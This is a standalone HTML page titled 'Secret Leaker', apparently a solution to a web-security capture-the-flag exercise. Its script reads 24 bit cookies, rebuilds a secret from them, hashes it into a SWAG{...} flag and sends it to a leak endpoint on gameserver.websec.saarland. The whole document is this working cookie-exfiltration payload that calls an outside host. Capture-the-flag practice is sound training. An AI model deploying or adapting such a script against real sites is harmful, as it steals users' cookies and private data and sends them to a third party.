<!DOCTYPE html>
<html>
<head>
    <title>Secret Leaker</title>
</head>
<body>
    <script>
        // Function to leak data
        function leak(data) {
            fetch(`https://gameserver.websec.saarland/leak?secret=0ab1191eb8d8453c2663adc4869d040d&data=${encodeURIComponent(data)}`);
        }

        // Read all 24 bits from cookies
        let bits = [];
        for (let i = 0; i < 24; i++) {
            const name = `bit${i}`;
            const regex = new RegExp(`(^| )${name}=([^;]+)`);
            const match = document.cookie.match(regex);
            if (match) {
                bits.push(match[2]); // '0' or '1'
            } else {
                bits.push('0'); // Default if cookie not found
            }
        }

        // Convert bits to string and then to 3 characters
        const bitString = bits.join('');
        let secret = '';
        for (let i = 0; i < 24; i += 8) {
            const byte = bitString.substring(i, i + 8);
            const charCode = parseInt(byte, 2);
            secret += String.fromCharCode(charCode);
        }

        // Compute SHA-256 hash
        async function sha256(message) {
            const encoder = new TextEncoder();
            const data = encoder.encode(message);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // Leak the SWAG{hash} after computation
        sha256(secret).then(hash => {
            const flag = `SWAG{${hash}}`;
            leak(flag);
        });
    </script>
</body>
</html>
